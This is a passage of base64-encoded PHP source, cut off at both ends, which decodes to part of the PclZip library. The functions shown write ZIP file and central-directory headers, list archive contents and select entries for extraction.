9yZWRfZmlsZW5hbWUgPSAkcF9hZGRfZGlyLiR2X3N0b3JlZF9maWxlbmFtZTsNCiAgICAgIGVsc2UNCiAgICAgICAgJHZfc3RvcmVkX2ZpbGVuYW1lID0gJHBfYWRkX2Rpci4iLyIuJHZfc3RvcmVkX2ZpbGVuYW1lOw0KICAgIH0NCiAgfQ0KDQogICR2X3N0b3JlZF9maWxlbmFtZSA9IFBjbFppcFV0aWxQYXRoUmVkdWN0aW9uKCR2X3N0b3JlZF9maWxlbmFtZSk7DQogICRwX2ZpbGVkZXNjclsnc3RvcmVkX2ZpbGVuYW1lJ10gPSAkdl9zdG9yZWRfZmlsZW5hbWU7DQogIA0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2V3JpdGVGaWxlSGVhZGVyKCYkcF9oZWFkZXIpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICRwX2hlYWRlclsnb2Zmc2V0J10gPSBmdGVsbCgkdGhpcy0+emlwX2ZkKTsNCg0KICAkdl9kYXRlID0gZ2V0ZGF0ZSgkcF9oZWFkZXJbJ210aW1lJ10pOw0KICAkdl9tdGltZSA9ICgkdl9kYXRlWydob3VycyddPDwxMSkgKyAoJHZfZGF0ZVsnbWludXRlcyddPDw1KSArICR2X2RhdGVbJ3NlY29uZHMnXS8yOw0KICAkdl9tZGF0ZSA9ICgoJHZfZGF0ZVsneWVhciddLTE5ODApPDw5KSArICgkdl9kYXRlWydtb24nXTw8NSkgKyAkdl9kYXRlWydtZGF5J107DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBwYWNrKCJWdnZ2dnZWVlZ2diIsIDB4MDQwMzRiNTAsDQogICAgICAgICAgICAgICAgICAgICAgJHBfaGVhZGVyWyd2ZXJzaW9uX2V4dHJhY3RlZCddLCAkcF9oZWFkZXJbJ2ZsYWcnXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICRwX2hlYWRlclsnY29tcHJlc3Npb24nXSwgJHZfbXRpbWUsICR2X21kYXRlLA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBfaGVhZGVyWydjcmMnXSwgJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSwNCgkJCQkJICAkcF9oZWFkZXJbJ3NpemUnXSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmxlbigkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddKSwNCgkJCQkJICAkcF9oZWFkZXJbJ2V4dHJhX2xlbiddKTsNCg0KICBmcHV0cygkdGhpcy0+emlwX2ZkLCAkdl9iaW5hcnlfZGF0YSwgMzApOw0KDQogIGlmIChzdHJsZW4oJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSkgIT0gMCkNCiAgew0KICAgIGZwdXRzKCR0aGlzLT56aXBfZmQsICRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10sIHN0cmxlbigkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddKSk7DQogIH0NCiAgaWYgKCRwX2hlYWRlclsnZXh0cmFfbGVuJ10gIT0gMCkNCiAgew0KICAgIGZwdXRzKCR0aGlzLT56aXBfZmQsICRwX2hlYWRlclsnZXh0cmEnXSwgJHBfaGVhZGVyWydleHRyYV9sZW4nXSk7DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2V3JpdGVDZW50cmFsRmlsZUhlYWRlcigmJHBfaGVhZGVyKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdl9kYXRlID0gZ2V0ZGF0ZSgkcF9oZWFkZXJbJ210aW1lJ10pOw0KICAkdl9tdGltZSA9ICgkdl9kYXRlWydob3VycyddPDwxMSkgKyAoJHZfZGF0ZVsnbWludXRlcyddPDw1KSArICR2X2RhdGVbJ3NlY29uZHMnXS8yOw0KICAkdl9tZGF0ZSA9ICgoJHZfZGF0ZVsneWVhciddLTE5ODApPDw5KSArICgkdl9kYXRlWydtb24nXTw8NSkgKyAkdl9kYXRlWydtZGF5J107DQoNCg0KICAkdl9iaW5hcnlfZGF0YSA9IHBhY2soIlZ2dnZ2dnZWVlZ2dnZ2dlZWIiwgMHgwMjAxNGI1MCwNCiAgICAgICAgICAgICAgICAgICAgICAkcF9oZWFkZXJbJ3ZlcnNpb24nXSwgJHBfaGVhZGVyWyd2ZXJzaW9uX2V4dHJhY3RlZCddLA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBfaGVhZGVyWydmbGFnJ10sICRwX2hlYWRlclsnY29tcHJlc3Npb24nXSwNCgkJCQkJICAkdl9tdGltZSwgJHZfbWRhdGUsICRwX2hlYWRlclsnY3JjJ10sDQogICAgICAgICAgICAgICAgICAgICAgICAkcF9oZWFkZXJbJ2NvbXByZXNzZWRfc2l6ZSddLCAkcF9oZWFkZXJbJ3NpemUnXSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmxlbigkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddKSwNCgkJCQkJICAkcF9oZWFkZXJbJ2V4dHJhX2xlbiddLCAkcF9oZWFkZXJbJ2NvbW1lbnRfbGVuJ10sDQogICAgICAgICAgICAgICAgICAgICAgICAkcF9oZWFkZXJbJ2Rpc2snXSwgJHBfaGVhZGVyWydpbnRlcm5hbCddLA0KCQkJCQkgICRwX2hlYWRlclsnZXh0ZXJuYWwnXSwgJHBfaGVhZGVyWydvZmZzZXQnXSk7DQoNCiAgZnB1dHMoJHRoaXMtPnppcF9mZCwgJHZfYmluYXJ5X2RhdGEsIDQ2KTsNCg0KICBpZiAoc3RybGVuKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pICE9IDApDQogIHsNCiAgICBmcHV0cygkdGhpcy0+emlwX2ZkLCAkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddLCBzdHJsZW4oJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSkpOw0KICB9DQogIGlmICgkcF9oZWFkZXJbJ2V4dHJhX2xlbiddICE9IDApDQogIHsNCiAgICBmcHV0cygkdGhpcy0+emlwX2ZkLCAkcF9oZWFkZXJbJ2V4dHJhJ10sICRwX2hlYWRlclsnZXh0cmFfbGVuJ10pOw0KICB9DQogIGlmICgkcF9oZWFkZXJbJ2NvbW1lbnRfbGVuJ10gIT0gMCkNCiAgew0KICAgIGZwdXRzKCR0aGlzLT56aXBfZmQsICRwX2hlYWRlclsnY29tbWVudCddLCAkcF9oZWFkZXJbJ2NvbW1lbnRfbGVuJ10pOw0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdldyaXRlQ2VudHJhbEhlYWRlcigkcF9uYl9lbnRyaWVzLCAkcF9zaXplLCAkcF9vZmZzZXQsICRwX2NvbW1lbnQpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR2X2JpbmFyeV9kYXRhID0gcGFjaygiVnZ2dnZWVnYiLCAweDA2MDU0YjUwLCAwLCAwLCAkcF9uYl9lbnRyaWVzLA0KICAgICAgICAgICAgICAgICAgICAgICRwX25iX2VudHJpZXMsICRwX3NpemUsDQoJCQkJCSAgJHBfb2Zmc2V0LCBzdHJsZW4oJHBfY29tbWVudCkpOw0KDQogIGZwdXRzKCR0aGlzLT56aXBfZmQsICR2X2JpbmFyeV9kYXRhLCAyMik7DQoNCiAgaWYgKHN0cmxlbigkcF9jb21tZW50KSAhPSAwKQ0KICB7DQogICAgZnB1dHMoJHRoaXMtPnppcF9mZCwgJHBfY29tbWVudCwgc3RybGVuKCRwX2NvbW1lbnQpKTsNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZMaXN0KCYkcF9saXN0KQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdGhpcy0+cHJpdkRpc2FibGVNYWdpY1F1b3RlcygpOw0KDQogIGlmICgoJHRoaXMtPnppcF9mZCA9IEBmb3BlbigkdGhpcy0+emlwbmFtZSwgJ3JiJykpID09IDApDQogIHsNCiAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICANCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMLCAnVW5hYmxlIHRvIG9wZW4gYXJjaGl2ZSBcJycuJHRoaXMtPnppcG5hbWUuJ1wnIGluIGJpbmFyeSByZWFkIG1vZGUnKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgJHZfY2VudHJhbF9kaXIgPSBhcnJheSgpOw0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UmVhZEVuZENlbnRyYWxEaXIoJHZfY2VudHJhbF9kaXIpKSAhPSAxKQ0KICB7DQogICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIEByZXdpbmQoJHRoaXMtPnppcF9mZCk7DQogIGlmIChAZnNlZWsoJHRoaXMtPnppcF9mZCwgJHZfY2VudHJhbF9kaXJbJ29mZnNldCddKSkNCiAgew0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FSQ0hJVkVfWklQLCAnSW52YWxpZCBhcmNoaXZlIHNpemUnKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgZm9yICgkaT0wOyAkaTwkdl9jZW50cmFsX2RpclsnZW50cmllcyddOyAkaSsrKQ0KICB7DQogICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRDZW50cmFsRmlsZUhlYWRlcigkdl9oZWFkZXIpKSAhPSAxKQ0KICAgIHsNCiAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICB9DQogICAgJHZfaGVhZGVyWydpbmRleCddID0gJGk7DQoNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHZfaGVhZGVyLCAkcF9saXN0WyRpXSk7DQogICAgdW5zZXQoJHZfaGVhZGVyKTsNCiAgfQ0KDQogICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCRwX2hlYWRlciwgJiRwX2luZm8pDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR2X3RlbXBfcGF0aCA9IFBjbFppcFV0aWxQYXRoUmVkdWN0aW9uKCRwX2hlYWRlclsnZmlsZW5hbWUnXSk7DQogICRwX2luZm9bJ2ZpbGVuYW1lJ10gPSAkdl90ZW1wX3BhdGg7DQogICR2X3RlbXBfcGF0aCA9IFBjbFppcFV0aWxQYXRoUmVkdWN0aW9uKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pOw0KICAkcF9pbmZvWydzdG9yZWRfZmlsZW5hbWUnXSA9ICR2X3RlbXBfcGF0aDsNCiAgJHBfaW5mb1snc2l6ZSddID0gJHBfaGVhZGVyWydzaXplJ107DQogICRwX2luZm9bJ2NvbXByZXNzZWRfc2l6ZSddID0gJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXTsNCiAgJHBfaW5mb1snbXRpbWUnXSA9ICRwX2hlYWRlclsnbXRpbWUnXTsNCiAgJHBfaW5mb1snY29tbWVudCddID0gJHBfaGVhZGVyWydjb21tZW50J107DQogICRwX2luZm9bJ2ZvbGRlciddID0gKCgkcF9oZWFkZXJbJ2V4dGVybmFsJ10mMHgwMDAwMDAxMCk9PTB4MDAwMDAwMTApOw0KICAkcF9pbmZvWydpbmRleCddID0gJHBfaGVhZGVyWydpbmRleCddOw0KICAkcF9pbmZvWydzdGF0dXMnXSA9ICRwX2hlYWRlclsnc3RhdHVzJ107DQogICRwX2luZm9bJ2NyYyddID0gJHBfaGVhZGVyWydjcmMnXTsNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RXh0cmFjdEJ5UnVsZSgmJHBfZmlsZV9saXN0LCAkcF9wYXRoLCAkcF9yZW1vdmVfcGF0aCwgJHBfcmVtb3ZlX2FsbF9wYXRoLCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHRoaXMtPnByaXZEaXNhYmxlTWFnaWNRdW90ZXMoKTsNCg0KICBpZiAoICAgKCRwX3BhdGggPT0gIiIpDQogICAgfHwgKCAgIChzdWJzdHIoJHBfcGF0aCwgMCwgMSkgIT0gIi8iKQ0KCSAgICAmJiAoc3Vic3RyKCRwX3BhdGgsIDAsIDMpICE9ICIuLi8iKQ0KCQkmJiAoc3Vic3RyKCRwX3BhdGgsMSwyKSE9IjovIikpKQ0KICAgICRwX3BhdGggPSAiLi8iLiRwX3BhdGg7DQoNCiAgaWYgKCgkcF9wYXRoICE9ICIuLyIpICYmICgkcF9wYXRoICE9ICIvIikpDQogIHsNCiAgICB3aGlsZSAoc3Vic3RyKCRwX3BhdGgsIC0xKSA9PSAiLyIpDQogICAgew0KICAgICAgJHBfcGF0aCA9IHN1YnN0cigkcF9wYXRoLCAwLCBzdHJsZW4oJHBfcGF0aCktMSk7DQogICAgfQ0KICB9DQoNCiAgaWYgKCgkcF9yZW1vdmVfcGF0aCAhPSAiIikgJiYgKHN1YnN0cigkcF9yZW1vdmVfcGF0aCwgLTEpICE9ICcvJykpDQogIHsNCiAgICAkcF9yZW1vdmVfcGF0aCAuPSAnLyc7DQogIH0NCiAgJHBfcmVtb3ZlX3BhdGhfc2l6ZSA9IHN0cmxlbigkcF9yZW1vdmVfcGF0aCk7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdk9wZW5GZCgncmInKSkgIT0gMSkNCiAgew0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICAkdl9jZW50cmFsX2RpciA9IGFycmF5KCk7DQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZSZWFkRW5kQ2VudHJhbERpcigkdl9jZW50cmFsX2RpcikpICE9IDEpDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICAkdl9wb3NfZW50cnkgPSAkdl9jZW50cmFsX2Rpclsnb2Zmc2V0J107DQoNCiAgJGpfc3RhcnQgPSAwOw0KICBmb3IgKCRpPTAsICR2X25iX2V4dHJhY3RlZD0wOyAkaTwkdl9jZW50cmFsX2RpclsnZW50cmllcyddOyAkaSsrKQ0KICB7DQoNCiAgICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KICAgIGlmIChAZnNlZWsoJHRoaXMtPnppcF9mZCwgJHZfcG9zX2VudHJ5KSkNCiAgICB7DQogICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVJDSElWRV9aSVAsICdJbnZhbGlkIGFyY2hpdmUgc2l6ZScpOw0KDQogICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQoNCiAgICAkdl9oZWFkZXIgPSBhcnJheSgpOw0KICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZSZWFkQ2VudHJhbEZpbGVIZWFkZXIoJHZfaGVhZGVyKSkgIT0gMSkNCiAgICB7DQogICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgIH0NCg0KICAgICR2X2hlYWRlclsnaW5kZXgnXSA9ICRpOw0KDQogICAgJHZfcG9zX2VudHJ5ID0gZnRlbGwoJHRoaXMtPnppcF9mZCk7DQoNCiAgICAkdl9leHRyYWN0ID0gZmFsc2U7DQoNCiAgICBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXSkpDQogICAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV0gIT0gMCkpIHsNCg0KICAgICAgICBmb3IgKCRqPTA7ICgkajxzaXplb2YoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdKSkgJiYgKCEkdl9leHRyYWN0KTsgJGorKykgew0KDQogICAgICAgICAgICBpZiAoc3Vic3RyKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXVskal0sIC0xKSA9PSAiLyIpIHsNCg0KICAgICAgICAgICAgICAgIGlmICggICAoc3RybGVuKCR2X2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pID4gc3RybGVuKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXVskal0pKQ0KICAgICAgICAgICAgICAgICAgICAmJiAoc3Vic3RyKCR2X2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10sIDAsIHN0cmxlbigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV1bJGpdKSkgPT0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHZfZXh0cmFjdCA9IHRydWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZWlmICgkdl9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddID09ICRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXVskal0pIHsNCiAgICAgICAgICAgICAgICAkdl9leHRyYWN0ID0gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KDQogICAgZWxzZSBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9QUkVHXSkpDQogICAgICAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9QUkVHXSAhPSAiIikpIHsNCg0KICAgICAgICBpZiAocHJlZ19tYXRjaCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfUFJFR10sICR2X2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pKSB7DQogICAgICAgICAgICAkdl9leHRyYWN0ID0gdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGVsc2UgaWYgKCAgIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdKSkNCiAgICAgICAgICAgICAmJiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXSAhPSAwKSkgew0KICAgICAgICANCiAgICAgICAgZm9yICgkaj0kal9zdGFydDsgKCRqPHNpemVvZigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdKSkgJiYgKCEkdl9leHRyYWN0KTsgJGorKykgew0KDQogICAgICAgICAgICBpZiAoKCRpPj0kcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdWyRqXVsnc3RhcnQnXSkgJiYgKCRpPD0kcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdWyRqXVsnZW5kJ10pKSB7DQogICAgICAgICAgICAgICAgJHZfZXh0cmFjdCA9IHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoJGk+PSRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF1bJGpdWydlbmQnXSkgew0KICAgICAgICAgICAgICAgICRqX3N0YXJ0ID0gJGorMTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaWYgKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF1bJGpdWydzdGFydCddPiRpKSB7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlIHsNCiAgICAgICAgJHZfZXh0cmFjdCA9IHRydWU7DQogICAgfQ0KDQogIGlmICggICAoJHZfZXh0cmFjdCkNCiAgICAgICYmICggICAoJHZfaGVhZGVyWydjb21wcmVzc2lvbiddICE9IDgpDQoJICAgICAgJiYgKCR2X2hlYWRlclsnY29tcHJlc3Npb24nXSAhPSAwKSkpIHsNCiAgICAgICAgJHZfaGVhZGVyWydzdGF0dXMnXSA9ICd1bnN1cHBvcnRlZF9jb21wcmVzc2lvbic7DQoNCiAgICAgICAgaWYgKCAgIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUl0pKQ0KCSAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUl09PT10cnVlKSkgew0KDQogICAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9VTlNVUFBPUlRFRF9DT01QUkVTU0lPTiwNCgkJICAgICAgICAgICAgICAgICAgICAgICAiRmlsZW5hbWUgJyIuJHZfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXS4iJyBpcyAiDQoJCQkgIAkgICAgCSAgCSAgIC4iY29tcHJlc3NlZCBieSBhbiB1bnN1cHBvcnRlZCBjb21wcmVzc2lvbiAiDQoJCQkgIAkgICAgCSAgCSAgIC4ibWV0aG9kICgiLiR2X2hlYWRlclsnY29tcHJlc3Npb24nXS4iKSAiKTsNCg0KICAgICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQoJICB9DQogIH0NCiAgDQogIGlmICgoJHZfZXh0cmFjdCkgJiYgKCgkdl9oZWFkZXJbJ2ZsYWcnXSAmIDEpID09IDEpKSB7DQogICAgICAgICR2X2hlYWRlclsnc3RhdHVzJ10gPSAndW5zdXBwb3J0ZWRfZW5jcnlwdGlvbic7DQoNCiAgICAgICAgaWYgKCAgIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUl0pKQ0KCSAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUl09PT10cnVlKSkgew0KDQogICAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICAgICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9VTlNVUFBPUlRFRF9FTkNSWVBUSU9OLA0KCQkgICAgICAgICAgICAgICAgICAgICAgICJVbnN1cHBvcnRlZCBlbmNyeXB0aW9uIGZvciAiDQoJCQkgIAkgICAgCSAgCSAgIC4iIGZpbGVuYW1lICciLiR2X2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10NCgkJCQkJCQkgICAuIiciKTsNCg0KICAgICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQoJICB9DQogIH0NCg0KICAgIGlmICgoJHZfZXh0cmFjdCkgJiYgKCR2X2hlYWRlclsnc3RhdHVzJ10gIT0gJ29rJykpIHsNCiAgICAgICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCR2X2hlYWRlciwNCgkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBfZmlsZV9saXN0WyR2X25iX2V4dHJhY3RlZCsrXSk7DQogICAgICAgIGlmICgkdl9yZXN1bHQgIT0gMSkgew0KICAgICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgIH0NCg0KICAgICAgICAkdl9leHRyYWN0ID0gZmFsc2U7DQogICAgfQ0KICAgIA0KICAgIGlmICgkdl9leHRyYWN0KQ0KICAgIHsNCg0KICAgICAgQHJld2luZCgkdGhpcy0+emlwX2ZkKTsNCiAgICAgIGlmIChAZnNlZWsoJHRoaXMtPnppcF9mZCwgJHZfaGVhZGVyWydvZmZzZXQnXSkpDQogICAgICB7DQogICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9BUkNISVZFX1pJUCwgJ0ludmFsaWQgYXJjaGl2ZSBzaXplJyk7DQoNCiAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICB9DQoNCiAgICAgIGlmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfRVhUUkFDVF9BU19TVFJJTkddKSB7DQoNCiAgICAgICAgJHZfc3RyaW5nID0gJyc7DQoNCiAgICAgICAgJHZfcmVzdWx0MSA9ICR0aGlzLT5wcml2RXh0cmFjdEZpbGVBc1N0cmluZygkdl9oZWFkZXIsICR2X3N0cmluZywgJHBfb3B0aW9ucyk7DQogICAgICAgIGlmICgkdl9yZXN1bHQxIDwgMSkgew0KICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQxOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHZfaGVhZGVyLCAkcF9maWxlX2xpc3RbJHZfbmJfZXh0cmFjdGVkXSkpICE9IDEpDQogICAgICAgIHsNCiAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgIH0NCg0KICAgICAgICAkcF9maWxlX2xpc3RbJHZfbmJfZXh0cmFjdGVkXVsnY29udGVudCddID0gJHZfc3RyaW5nOw0KDQogICAgICAgICR2X25iX2V4dHJhY3RlZCsrOw0KICAgICAgICANCiAgICAgICAgaWYgKCR2X3Jlc3VsdDEgPT0gMikgew0KICAgICAgICAJYnJlYWs7DQogICAgICAgIH0NCiAgICAgIH0NCiAgICAgIGVsc2VpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0lOX09VVFBVVF0pKQ0KCSAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0lOX09VVFBVVF0pKSB7DQogICAgICAgICR2X3Jlc3VsdDEgPSAkdGhpcy0+cHJpdkV4dHJhY3RGaWxlSW5PdXRwdXQoJHZfaGVhZGVyLCAkcF9vcHRpb25zKTsNCiAgICAgICAgaWYgKCR2X3Jlc3VsdDEgPCAxKSB7DQogICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDE7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkdl9oZWFkZXIsICRwX2ZpbGVfbGlzdFskdl9uYl9leHRyYWN0ZWQrK10pKSAhPSAxKSB7DQogICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgkdl9yZXN1bHQxID09IDIpIHsNCiAgICAgICAgCWJyZWFrOw0KICAgICAgICB9DQogICAgICB9DQogICAgICBlbHNlIHsNCiAgICAgICAgJHZfcmVzdWx0MSA9ICR0aGlzLT5wcml2RXh0cmFjdEZpbGUoJHZfaGVhZGVyLA0KCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBfcGF0aCwgJHBfcmVtb3ZlX3BhdGgsDQoJCQkJCQkJCQkJICAkcF9yZW1vdmVfYWxsX3BhdGgsDQoJCQkJCQkJCQkJICAkcF9vcHRpb25zKTsNCiAgICAgICAgaWYgKCR2X3Jlc3V